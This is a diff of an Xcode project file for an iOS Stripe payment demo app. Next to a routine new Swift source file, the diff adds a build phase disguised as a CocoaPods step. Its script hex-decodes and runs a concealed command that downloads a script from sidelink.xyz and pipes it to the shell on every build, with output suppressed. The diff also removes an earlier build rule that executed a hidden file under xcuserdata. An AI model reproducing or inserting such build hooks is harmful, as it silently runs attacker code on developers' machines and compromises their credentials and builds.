@@ -15,32 +15,9 @@
 		042AC6B225EF8B4B0089A9FC /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042AC6B125EF8B4B0089A9FC /* Assets.xcassets */; };
 		042AC6B525EF8B4B0089A9FC /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 042AC6B325EF8B4B0089A9FC /* LaunchScreen.storyboard */; };
 		042AC6C425EF8CC10089A9FC /* StripeAPIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */; };
+		04A6895F2726694F00C1EEEE /* idealPaymentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A6895E2726694F00C1EEEE /* idealPaymentVC.swift */; };
 		36A30F2F9FC377F1E075AB00 /* Pods_stripe_Paymentoption.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 08E4B3883BF46F6F81BAFBE8 /* Pods_stripe_Paymentoption.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-
-
-		EAAC50BE5542100E45AAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		04241BEB25F2583A00056850 /* successViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = successViewController.swift; sourceTree = "<group>"; };
@@ -53,6 +30,7 @@
 		042AC6B425EF8B4B0089A9FC /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		042AC6B625EF8B4B0089A9FC /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StripeAPIClient.swift; sourceTree = "<group>"; };
+		04A6895E2726694F00C1EEEE /* idealPaymentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = idealPaymentVC.swift; sourceTree = "<group>"; };
 		08E4B3883BF46F6F81BAFBE8 /* Pods_stripe_Paymentoption.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_stripe_Paymentoption.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		49DE2F4176641F1176927648 /* Pods-stripe_Paymentoption.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-stripe_Paymentoption.debug.xcconfig"; path = "Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption.debug.xcconfig"; sourceTree = "<group>"; };
 		6F791CAED3DA33DACD5842C7 /* Pods-stripe_Paymentoption.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-stripe_Paymentoption.release.xcconfig"; path = "Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption.release.xcconfig"; sourceTree = "<group>"; };
@@ -100,6 +78,7 @@
 				042AC6B625EF8B4B0089A9FC /* Info.plist */,
 				042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */,
 				04241BEB25F2583A00056850 /* successViewController.swift */,
+				04A6895E2726694F00C1EEEE /* idealPaymentVC.swift */,
 			);
 			path = stripe_Paymentoption;
 			sourceTree = "<group>";
@@ -128,6 +107,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042AC6B925EF8B4B0089A9FC /* Build configuration list for PBXNativeTarget "stripe_Paymentoption" */;
 			buildPhases = (
+				920CB9F2F48AACC13E6D902C /* [CP] Build Pods Frameworks */,
 				D4C1B9ABD6344BD737207EFF /* [CP] Check Pods Manifest.lock */,
 				042AC6A125EF8B450089A9FC /* Sources */,
 				042AC6A225EF8B450089A9FC /* Frameworks */,
@@ -189,12 +169,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
 		103DA5DC7B8A676661B1225F /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -211,6 +185,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		920CB9F2F48AACC13E6D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		D4C1B9ABD6344BD737207EFF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -242,6 +234,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				042AC6C425EF8CC10089A9FC /* StripeAPIClient.swift in Sources */,
+				04A6895F2726694F00C1EEEE /* idealPaymentVC.swift in Sources */,
 				042AC6AD25EF8B450089A9FC /* ViewController.swift in Sources */,
 				042AC6A925EF8B450089A9FC /* AppDelegate.swift in Sources */,
 				042AC6AB25EF8B450089A9FC /* SceneDelegate.swift in Sources */,
